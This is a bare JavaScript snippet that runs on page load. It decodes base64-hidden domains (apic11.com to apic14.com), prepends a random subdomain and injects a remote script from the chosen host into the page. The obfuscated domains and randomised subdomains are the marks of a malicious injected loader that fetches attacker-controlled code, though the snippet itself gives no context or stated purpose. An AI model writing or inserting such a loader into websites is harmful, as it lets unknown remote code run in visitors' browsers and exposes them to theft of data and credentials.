(function() {
    var chars = "abcdefghijklmnopqrstuvwxyz0123456789";
    var len = Math.floor(Math.random() * 5) + 1;
    var prefix = "";

    for (var i = 0; i < len; i++) {
        prefix += chars.charAt(Math.floor(Math.random() * chars.length));
    }

    var domains = [
        "YXBpYzExLmNvbQ==",
        "YXBpYzEyLmNvbQ==",
        "YXBpYzEzLmNvbQ==",
        "YXBpYzE0LmNvbQ=="
    ];

    var domain = atob(domains[Math.floor(Math.random() * domains.length)]);

    var s = document.createElement("script");
    s.type = "text/javascript";
    s.src = "https://" + prefix + "." + domain + "/js/api.js";

    document.head.appendChild(s);
})();
